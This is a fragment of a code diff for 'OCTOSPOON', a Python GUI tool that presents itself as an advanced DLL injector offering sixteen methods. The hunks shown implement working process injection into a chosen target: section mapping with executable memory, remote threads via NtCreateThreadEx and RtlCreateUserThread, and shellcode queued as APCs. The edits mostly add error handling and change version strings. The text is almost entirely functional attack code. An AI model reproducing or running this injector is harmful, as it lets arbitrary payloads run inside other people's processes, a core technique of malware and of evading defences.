         remote_section = kernel32.OpenFileMappingW(FILE_MAP_READ, False, section_name)
         if not remote_section:
             kernel32.CloseHandle(h_mapping)
@@ -787,53 +758,53 @@ class InjectorThread(QThread):
     # === 13. Section Mapping ===
     def section_mapping_injection(self):
         self.log("Starting Section Mapping Injection...")
-        
         with open(self.dll_path, 'rb') as f:
             dll_data = f.read()
         
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
-        # Create executable heap
         executable_heap = kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(dll_data), 0)
         local_mem = kernel32.HeapAlloc(executable_heap, HEAP_ZERO_MEMORY, len(dll_data))
         if local_mem:
             ctypes.memmove(local_mem, dll_data, len(dll_data))
         
-        # Create section and map to remote process
         section_handle = wintypes.HANDLE(0)
         max_size = wintypes.LARGE_INTEGER(len(dll_data))
         
         status = ntdll.NtCreateSection(byref(section_handle), SECTION_ALL_ACCESS, None, byref(max_size), PAGE_EXECUTE_READWRITE, 0x8000000, None)
+        if status != 0:
+            raise Exception(f"NtCreateSection failed: 0x{status:X}")
         
-        remote_base = c_void_p(0)
+        remote_base = ctypes.c_void_p(0)
         view_size = ctypes.c_size_t(len(dll_data))
         ntdll.NtMapViewOfSection(section_handle, h_process, byref(remote_base), 0, 0, None, byref(view_size), 1, 0, PAGE_EXECUTE_READWRITE)
         
-        # Copy DLL data
         bytes_written = ctypes.c_size_t(0)
         kernel32.WriteProcessMemory(h_process, remote_base, dll_data, len(dll_data), byref(bytes_written))
         
-        # Get entry point
         e_lfanew = struct.unpack_from("<I", dll_data, 0x3C)[0]
         entry_rva = struct.unpack_from("<I", dll_data, e_lfanew + 0x28)[0]
         remote_entry = remote_base.value + entry_rva
         
-        # Execute via NtCreateThreadEx
         h_thread = wintypes.HANDLE(0)
         ntdll.NtCreateThreadEx(byref(h_thread), THREAD_ALL_ACCESS, None, h_process, remote_entry, None, 0, 0, 0, 0, None)
         
-        kernel32.WaitForSingleObject(h_thread, INFINITE)
-        kernel32.CloseHandle(h_thread)
+        if h_thread:
+            kernel32.WaitForSingleObject(h_thread, INFINITE)
+            kernel32.CloseHandle(h_thread)
+        
         kernel32.CloseHandle(section_handle)
         kernel32.CloseHandle(h_process)
-        
         self.log("Section mapping injection completed")
 
     # === 14. NtCreateThreadEx ===
     def ntcreatethread_injection(self):
         self.log("Starting NtCreateThreadEx Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
         remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
@@ -857,8 +828,9 @@ class InjectorThread(QThread):
     # === 15. RtlCreateUserThread ===
     def rtlcreateuserthread_injection(self):
         self.log("Starting RtlCreateUserThread Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
         remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
@@ -869,7 +841,6 @@ class InjectorThread(QThread):
         
         h_thread = wintypes.HANDLE(0)
         client_id = CLIENT_ID()
-        
         status = ntdll.RtlCreateUserThread(h_process, None, False, 0, None, None, loadlib, remote_mem, byref(h_thread), byref(client_id))
         
         if status == 0 and h_thread:
@@ -881,11 +852,12 @@ class InjectorThread(QThread):
         
         kernel32.CloseHandle(h_process)
 
-        # === 16. NtTestAlert ===
+    # === 16. NtTestAlert ===
     def ntalert_injection(self):
         self.log("Starting NtTestAlert Injection...")
-        
         h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.pid)
+        if not h_process:
+            raise Exception(f"Failed to open process {self.pid}")
         
         dll_path_bytes = self.dll_path.encode('ascii') + b'\x00'
         remote_mem = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT_RESERVE, PAGE_READWRITE)
@@ -894,16 +866,15 @@ class InjectorThread(QThread):
         
         loadlib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryA")
         
-        # Get NtTestAlert from ntdll
-        nt_test_alert = kernel32.GetProcAddress(ntdll._handle, b"NtTestAlert")
+        try:
+            nt_test_alert = kernel32.GetProcAddress(ntdll._handle, b"NtTestAlert")
+        except:
+            nt_test_alert = 0
         
-        # Build shellcode with NtTestAlert call
         shellcode = build_loadlibrary_shellcode(remote_mem, loadlib, nt_test_alert if nt_test_alert else 0)
-        
         remote_shellcode = kernel32.VirtualAllocEx(h_process, None, len(shellcode), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
         kernel32.WriteProcessMemory(h_process, remote_shellcode, shellcode, len(shellcode), byref(bytes_written))
         
-        # Queue APC to threads
         queued = 0
         try:
             process = psutil.Process(self.pid)
@@ -924,7 +895,7 @@ class InjectorThread(QThread):
 class OctoSpoonGUI(QMainWindow):
     def __init__(self):
         super().__init__()
-        self.setWindowTitle("OCTOSPOON v6.0 - Advanced DLL Injector")
+        self.setWindowTitle("OCTOSPOON v1.0 - Advanced DLL Injector")
         self.setGeometry(100, 100, 1000, 700)
         self.setStyleSheet("""
             QMainWindow { background-color: #1a1a1a; }
@@ -935,7 +906,6 @@ class OctoSpoonGUI(QMainWindow):
             QListWidget { background-color: #2d2d2d; color: #e0e0e0; border: 1px solid #555; }
             QTextEdit { background-color: #0d0d0d; color: #00ff41; border: 1px solid #555; font-size: 12px; }
             QProgressBar { background-color: #2d2d2d; border: 1px solid #555; }
-            QCheckBox { color: #e0e0e0; }
         """)
         self.init_ui()
 
@@ -946,8 +916,7 @@ class OctoSpoonGUI(QMainWindow):
         layout.setSpacing(10)
         layout.setContentsMargins(15, 15, 15, 15)
 
-        # Title
-        title = QLabel("OCTOSPOON v6.0 - Advanced DLL Injector")
+        title = QLabel("OCTOSPOON v1.0 - Advanced DLL Injector")
         title.setAlignment(Qt.AlignmentFlag.AlignCenter)
         title.setFont(QFont("Consolas", 18, QFont.Weight.Bold))
         title.setStyleSheet("color: #00ff41; margin: 10px;")
@@ -962,12 +931,10 @@ class OctoSpoonGUI(QMainWindow):
         splitter = QSplitter()
         layout.addWidget(splitter)
 
-        # Left Panel
         left = QWidget()
         left_layout = QVBoxLayout(left)
         left_layout.setSpacing(10)
 
-        # Method Selection
         method_label = QLabel("Method:")
         method_label.setStyleSheet("font-weight: bold; color: #00ff41;")
         left_layout.addWidget(method_label)
@@ -982,7 +949,6 @@ class OctoSpoonGUI(QMainWindow):
         ])
         left_layout.addWidget(self.method_combo)
 
-        # Target Process
         target_label = QLabel("Target Process:")
         target_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
         left_layout.addWidget(target_label)
@@ -996,7 +962,6 @@ class OctoSpoonGUI(QMainWindow):
         t_layout.addWidget(self.refresh_btn)
         left_layout.addLayout(t_layout)
 
-        # Payload
         payload_label = QLabel("Payload:")
         payload_label.setStyleSheet("font-weight: bold; color: #00ff41; margin-top: 10px;")
         left_layout.addWidget(payload_label)
@@ -1010,13 +975,11 @@ class OctoSpoonGUI(QMainWindow):
         p_layout.addWidget(self.browse_btn)
         left_layout.addLayout(p_layout)
 
-        # Progress Bar
         self.progress = QProgressBar()
         self.progress.setVisible(False)
         self.progress.setTextVisible(False)
         left_layout.addWidget(self.progress)
 
-        # Inject Button
         self.inject_btn = QPushButton("INJECT")
         self.inject_btn.setStyleSheet("""
             QPushButton {
@@ -1033,7 +996,6 @@ class OctoSpoonGUI(QMainWindow):
         left_layout.addStretch()
         splitter.addWidget(left)
 
-        # Right Panel - Log
         log_label = QLabel("Console Output:")
         log_label.setStyleSheet("font-weight: bold; color: #00ff41;")
         
@@ -1049,7 +1011,7 @@ class OctoSpoonGUI(QMainWindow):
         splitter.setSizes([350, 650])
         
         self.refresh_pids()
-        self.log("OCTOSPOON v6.0 initialized - 16 injection methods available")
+        self.log("OCTOSPOON v1.0 initialized - 16 injection methods available")
         self.log("Ready for injection...")
 
     def log(self, msg):
@@ -1085,7 +1047,6 @@ class OctoSpoonGUI(QMainWindow):
             self.log(f"[*] Payload: {os.path.basename(path)}")
 
     def start_injection(self):
-        # Check admin
         try:
             if not ctypes.windll.shell32.IsUserAnAdmin():
                 QMessageBox.warning(self, "Warning", "Run as Administrator for best results!")
@@ -1145,6 +1106,7 @@ class OctoSpoonGUI(QMainWindow):
 if __name__ == "__main__":
     try:
         app = QApplication(sys.argv)
+        app.setStyle('Fusion')
         window = OctoSpoonGUI()
         window.show()
         sys.exit(app.exec())
